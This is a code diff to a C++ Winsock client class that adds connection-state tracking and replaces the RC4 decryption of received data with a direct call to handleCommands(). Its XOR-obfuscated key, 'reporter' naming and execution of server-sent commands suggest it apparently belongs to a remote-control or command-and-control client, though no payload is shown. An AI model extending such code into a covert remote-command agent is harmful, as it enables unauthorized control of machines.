@@ -1,6 +1,6 @@
 #include "csocket.hpp"
 
-csocket::Socket::Socket(std::string DM, std::string IP, int Port)
+csocket::Socket::Socket(std::string DM, std::string IP, int Port) : connectionFailed(true)
 {
     this->DM = DM;
     this->IP = IP;
@@ -22,9 +22,11 @@ SOCKET csocket::Socket::Init()
     SOCKET thisSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (thisSock == INVALID_SOCKET)
     {
+        this->connectionFailed = true;
         WSACleanup();
         return -1;
     }
+    this->connectionFailed = false;
     this->sock_fd = thisSock;
     return thisSock;
 }
@@ -49,10 +51,12 @@ int csocket::Socket::Connect()
         writeLog("Fail to connect to server ... ", StandardLogPath, "Fail");
         writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
 #endif
+        this->connectionFailed = true;
         closesocket(this->sock_fd);
         WSACleanup();
         return -1;
     }
+    this->connectionFailed = false;
     return connRes;
 #endif
 #ifdef DOMAIN_NAME_MODE
@@ -71,11 +75,13 @@ int csocket::Socket::Connect()
         writeLog("Fail to get server info ... ", StandardLogPath, "Fail");
         writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
 #endif
+        this->connectionFailed = true;
         closesocket(this->sock_fd);
         WSACleanup();
         return -1;
     }
 
+    this->connectionFailed = false;
     sockaddr_in serverAddr;
     memcpy(&serverAddr, serverInfos->ai_addr, serverInfos->ai_addrlen);
     serverAddr.sin_family = AF_INET;
@@ -88,54 +94,51 @@ int csocket::Socket::Connect()
         writeLog("Fail to connect to server ... ", StandardLogPath, "Fail");
         writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
 #endif
+        this->connectionFailed = true;
         closesocket(this->sock_fd);
         WSACleanup();
         return -1;
     }
+    this->connectionFailed = false;
 
 #endif
     return 0;
 }
 
-int csocket::Socket::Recv(std::string *data)
+int csocket::Socket::Recv()
 {
-    // key of rc4
-    char* ckey = INET_KEY;
-    unxor(ckey);
-    std::string key(ckey);
-    
     char buf[SO_RCVBUF] = {0};
     int recvLen = recv(this->sock_fd, buf, SO_RCVBUF, 0);
 
-    if (recvLen == SOCKET_ERROR)
+    // std::cout << WSAGetLastError() << std::endl;
+    if (recvLen == SOCKET_ERROR || recvLen == 0)
     {
 #ifdef REPORTER_DEBUG_MODE
         writeLog("Fail to recv ... ", StandardLogPath, "Fail");
         writeLog("WSA_Last_Error: " + WSAGetLastError(), StandardLogPath, "Fail");
 #endif
+        this->connectionFailed = true;
         closesocket(this->sock_fd);
         WSACleanup();
         return -1;
     }
+    this->connectionFailed = false;
 
-    // Decrypt datas
+    // // Decrypt datas
     std::string cdata(buf);
-    std::vector<int> S(256);
-    std::vector<int> T(256);
-
-    for(int i=0; i<256; i++){
-        S[i] = i;
-    	T[i] = key[(i % key.length())];
-    }
-
-    S = permute(S, T);
-    *data = rc4(S, cdata);
+    handleCommands(cdata);
 
     return 0;
 }
 
+bool csocket::Socket::isNotConnected()
+{
+    return this->connectionFailed;
+}
+
 void csocket::Socket::Close()
 {
+    this->connectionFailed = true;
     closesocket(this->sock_fd);
     WSACleanup();
 }
